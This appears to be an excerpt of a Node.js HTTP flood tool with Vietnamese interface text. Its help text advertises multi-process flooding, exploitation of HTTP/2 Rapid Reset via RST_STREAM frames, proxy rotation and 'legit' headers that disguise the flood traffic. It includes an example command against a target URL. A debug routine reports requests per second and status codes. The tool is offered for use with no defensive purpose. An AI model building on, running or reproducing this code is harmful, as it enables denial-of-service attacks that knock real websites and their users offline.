...
const useLegitHeaders = process.argv.includes('--bixd');
...
if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.clear();
console.error(`
${'Cập Nhật Flood:'.yellow.underline}
  ${'-Tạo nhiều tiến trình con (worker) để phân tán cuộc tấn công trên nhiều lõi CPU.'.red}
  ${'-Nén header HTTP/2 (hpack) để mã hóa header hiệu quả.'.red}
  ${'-Khai thác HTTP/2 Rapid Reset gửi frame RST_STREAM tạo nhiều stream nhanh chóng.'.red}
  ${'-Sửa lại phần header legit giúp request tự nhiên flood.'.red}

${'Tùy chọn:'.yellow.underline}
  ${'--bixd'.green}         Bắt Buộc Áp Dụng Nếu Muốn Flood
  ...
  ${'--debug'.green}          Hiển thị mã trạng thái (giảm RPS)
  ${'--delay <1-1000>'.green} Độ trễ giữa các yêu cầu 1-100 ms

${'Cách sử dụng:'.yellow.underline}
  ${'Cú pháp:'.cyan} node ${process.argv[1]} <GET/POST> <target> <time> <threads> <ratelimit> <proxy>
  ${'Ví dụ:'.cyan} node ${process.argv[1]} GET "https://target.com?q=%RAND%" 120 16 90 proxy.txt \\
         --query 1 --cookie "uh=good" --http 2 --debug --full --bixd \\
`.gray);
process.exit(1);
}
...
if (debugMode) {
    setInterval(() => {
        ...
        const freeMem = os.freemem(); // RAM còn trống (bytes)
        const usedMem = totalMem - freeMem; // RAM đã sử dụng
        const usedMemPercent = ((usedMem / totalMem) * 100).toFixed(2); // % RAM sử dụng
        const freeMemPercent = (100 - usedMemPercent).toFixed(2); // % RAM còn trống

        // Xóa console trước khi hiển thị
        console.clear();

        // In tiêu đề
        console.log(`\n${'Trạng thái request (Cập nhật: ' + new Date().toLocaleString('vi-VN') + ')'.bold.blue.underline}`);
        
        // In bảng
        console.log(`${'Mã trạng thái'.padEnd(15).cyan} | ${'Quantity'.cyan}`);
        ...
        for (let [code, count] of sortedStatuses) {
            ...
            console.log(`${coloredCode} | ${count.toString().white}`);
        }
        console.log('-'.repeat(30).gray);
        console.log(`${'|Total RPS'.padEnd(15).cyan} | ${total.toString().white}`);
        // Status RAM
        console.log(`${'RAM sử dụng'.padEnd(15).white} | ${usedMemPercent}%`.green);
        console.log(`${'RAM còn trống'.padEnd(15).white} | ${freeMemPercent}%`.green);

        // Cảnh báo khi RAM sử dụng >= 85%
        if (usedMemPercent >= 85) {
            console.log(`\n${'Warning: RAM max server you!'.bold.red}`);
        }
    }, 1000);
}
